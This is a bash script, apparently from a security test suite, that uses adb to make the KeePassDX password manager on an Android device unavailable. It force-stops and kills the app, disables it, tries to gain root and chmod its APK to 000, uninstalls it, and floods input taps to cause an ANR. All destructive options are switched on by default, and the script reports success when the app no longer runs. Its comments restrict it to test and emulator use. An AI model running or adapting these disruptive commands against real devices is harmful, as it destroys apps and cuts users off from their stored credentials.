#!/usr/bin/env bash
# vuln_scenario_1/vuln.sh
# DoS / disruptive scenario for KeePassDX (DESCTRUCTIVE allowed).
# IMPORTANT: This script WILL attempt destructive actions if configured (uninstall).
# It WILL NOT remove or modify the device DB file (/sdcard/Download/db_valid.kdbx).
#
# Goals:
#  - Make the KeePassDX app unavailable (prevent launch/responding) without touching the DB file.
#  - Provide clear diagnostics for why availability may still be present.
#
# WARNING: Use in test/emulator environments only.

set -euo pipefail
LOG_PREFIX="[vuln_scenario_1]"

log() { echo "${LOG_PREFIX} $*"; }
logerr() { echo "${LOG_PREFIX} $*" >&2; }

# --- CONFIG ---
ALLOW_UNINSTALL=true    # If true, attempt pm uninstall --user 0 (destructive)
INPUT_FLOOD=true        # If true, perform input flood to provoke ANR (optional)
TRY_APK_DISABLE=true    # If true, attempt to chmod 000 the APK (requires adb root/remount); risky
PACKAGE_HINT="keepass"   # package name hint; used to detect package; fallback canonical package used
DEVICE_DB_PATH="/sdcard/Download/db_valid.kdbx"
VERIFY_TIMEOUT=6         # seconds to wait after attempting a restart
WAIT_SHORT=1

# --- sanity checks ---
if ! command -v adb >/dev/null 2>&1; then
    logerr "ERROR: adb not found in PATH."
    exit 2
fi

# Optional: allow choosing a serial with ADB_DEVICE_SERIAL env
ADB_SERIAL_FLAG=()
if [[ -n "${ADB_DEVICE_SERIAL:-}" ]]; then
    ADB_SERIAL_FLAG+=("-s" "${ADB_DEVICE_SERIAL}")
fi

run_adb() {
    adb "${ADB_SERIAL_FLAG[@]}" "$@"
}

# --- 1) detect package(s) ---
log "Detecting KeePassDX package (hint='${PACKAGE_HINT}')..."
PKG_NAMES=$(run_adb shell pm list packages | tr -d '\r' | awk -F: '{print $2}' | grep -i "${PACKAGE_HINT}" || true)

if [[ -z "${PKG_NAMES}" ]]; then
    log "No package matched hint '${PACKAGE_HINT}'. Using canonical fallback 'com.kunzisoft.keepass.libre'."
    PKG="com.kunzisoft.keepass.libre"
else
    PKG=$(echo "${PKG_NAMES}" | head -n1 | tr -d '[:space:]')
fi
log "Target package: ${PKG}"
log "Candidate packages found (if any):"
echo "${PKG_NAMES}" | sed 's/^/  - /' || true

# --- 2) force-stop & kill pids (non-destructive) ---
log "Attempting am force-stop ${PKG}..."
run_adb shell "am force-stop ${PKG}" >/dev/null 2>&1 || logerr "am force-stop returned non-zero"

sleep "${WAIT_SHORT}"

PIDS=$(run_adb shell "pidof ${PKG}" 2>/dev/null | tr -d '\r' || true)
if [[ -n "${PIDS}" ]]; then
    log "Found PIDs: ${PIDS} — attempting kill -9"
    for pid in ${PIDS}; do
        run_adb shell "kill -9 ${pid}" >/dev/null 2>&1 || logerr "failed to kill ${pid}"
    done
else
    log "No PIDs found via pidof. Trying ps fallback..."
    PS_OUT=$(run_adb shell "ps -A | grep ${PKG}" 2>/dev/null || true)
    if [[ -n "${PS_OUT}" ]]; then
        echo "${PS_OUT}" | tr -d '\r' | awk '{print $2}' | while read -r fallback_pid; do
            if [[ -n "${fallback_pid}" ]]; then
                run_adb shell "kill -9 ${fallback_pid}" >/dev/null 2>&1 || logerr "failed to kill ${fallback_pid}"
            fi
        done
    fi
fi

sleep "${WAIT_SHORT}"

# --- 3) attempt to disable package (preferred non-destructive step) ---
log "Attempting pm disable-user --user 0 ${PKG}..."
if run_adb shell "pm disable-user --user 0 ${PKG}" >/dev/null 2>&1; then
    log "pm disable-user issued (may have succeeded)."
else
    logerr "pm disable-user failed or returned non-zero (may require root/writable system)."
fi

sleep "${WAIT_SHORT}"

# --- 4) attempt to make APK non-executable/readable (only if requested & possible) ---
APKS_PATH=""
if [[ "${TRY_APK_DISABLE}" == "true" ]]; then
    log "TRY_APK_DISABLE=true — attempting to locate APK path and chmod 000 (requires adb root/remount)."
    # find APK path(s) for package
    APKS_PATH=$(run_adb shell "pm path ${PKG} 2>/dev/null" | tr -d '\r' || true)
    if [[ -n "${APKS_PATH}" ]]; then
        echo "${APKS_PATH}" | while read -r line; do
            # pm path output: package:/data/app/~~.../base.apk
            apk_path="${line#package:}"
            log "Found apk: ${apk_path} — attempting chmod 000"
            # attempt remount + chmod (may require adb root)
            run_adb root >/dev/null 2>&1 || true
            run_adb remount >/dev/null 2>&1 || true
            if run_adb shell "chmod 000 '${apk_path}'" >/dev/null 2>&1; then
                log "chmod 000 succeeded on ${apk_path} (app should not be launchable)."
            else
                logerr "chmod 000 failed on ${apk_path} (permission denied)."
            fi
        done
    else
        log "Could not determine APK path for ${PKG}."
    fi
else
    log "TRY_APK_DISABLE disabled; skipping APK chmod step."
fi

sleep "${WAIT_SHORT}"

# --- 5) optionally uninstall (destructive) ---
if [[ "${ALLOW_UNINSTALL}" == "true" ]]; then
    log "ALLOW_UNINSTALL=true — attempting pm uninstall --user 0 ${PKG} (destructive)."
    if run_adb shell "pm uninstall --user 0 ${PKG}" >/dev/null 2>&1; then
        log "pm uninstall --user 0 succeeded. Package removed for this user."
    else
        logerr "pm uninstall failed or returned non-zero."
    fi
else
    log "ALLOW_UNINSTALL=false — skipping uninstall step."
fi

sleep "${WAIT_SHORT}"

# --- 6) optional input flood to provoke ANR (non-destructive but disruptive) ---
if [[ "${INPUT_FLOOD}" == "true" ]]; then
    log "INPUT_FLOOD=true — sending rapid input taps to attempt ANR."
    for i in $(seq 1 150); do
        run_adb shell input tap 500 500 >/dev/null 2>&1 || true
        sleep 0.01
    done
    log "Input flood done."
else
    log "INPUT_FLOOD disabled; skipping."
fi

# --- 7) verification: attempt to start app and check for process/activity ---
log "Verifying availability by attempting to start the app..."

# Clear recent logcat for fresh diagnostics
run_adb logcat -c >/dev/null 2>&1 || true

# Try a targeted start; some packages require a specific activity — use generic launch fallback via monkey if start errors
START_OUT=$((run_adb shell am start -W -n "${PKG}/.activities.FileDatabaseSelectActivity" 2>&1) || true)
if echo "${START_OUT}" | grep -qi "Error\|Exception"; then
    log "Targeted start returned an error; trying generic launcher via monkey..."
    run_adb shell monkey -p "${PKG}" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1 || true
fi

sleep "${VERIFY_TIMEOUT}"

AFTER_PIDS=$(run_adb shell "pidof ${PKG}" 2>/dev/null | tr -d '\r' || true)
LOGS=$(run_adb logcat -d -t 200 2>/dev/null || true)
HAS_ERR=$(echo "${LOGS}" | grep -Ei "Fatal|ANR|Exception|SecurityException|NoSuchFile|ActivityNotFound" || true)

if [[ -z "${AFTER_PIDS}" ]]; then
    log "No running process detected for ${PKG} — app likely unavailable."
    AVAIL=1
else
    log "Process(es) still running for ${PKG}: ${AFTER_PIDS} — app still available."
    AVAIL=0
fi

# 8) print diagnostics (stdout)
cat <<EOF
${LOG_PREFIX} SUMMARY:
- Target package: ${PKG}
- Candidate package list (if any):
$(echo "${PKG_NAMES}" | sed 's/^/  - /')
- Device DB path (untouched): ${DEVICE_DB_PATH}
- TRY_APK_DISABLE: ${TRY_APK_DISABLE}
- ALLOW_UNINSTALL: ${ALLOW_UNINSTALL}
- INPUT_FLOOD: ${INPUT_FLOOD}
- After operations, running PIDs: ${AFTER_PIDS:-<none>}
- Recent logcat error lines (if any):
$(echo "${HAS_ERR}" | sed 's/^/  /')
- Availability impact (1 = unavailable / success, 0 = still available / failure): ${AVAIL}
EOF

# Exit: 0 if we achieved unavailability (AVAIL==1), 1 otherwise
if [[ "${AVAIL}" -eq 1 ]]; then
    log "vuln_scenario_1 succeeded in making app unavailable (without touching DB file)."
    exit 0
else
    logerr "vuln_scenario_1 did NOT make app unavailable. See diagnostics above."
    exit 1
fi
